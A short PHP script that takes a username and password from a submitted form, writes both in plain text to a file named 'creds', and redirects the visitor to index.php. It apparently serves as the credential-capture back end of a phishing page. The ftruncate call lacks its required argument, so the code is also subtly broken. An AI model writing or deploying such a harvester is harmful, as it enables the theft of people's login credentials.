<?php

    $credsfile = fopen("creds", "w") or die("Unable to open file!");
    ftruncate($credsfile);
    fwrite($credsfile, $_POST['username']);
    fwrite($credsfile, "\n");
    fwrite($credsfile, $_POST['password']);
    fclose($credsfile);

    header("Location: index.php");
?>
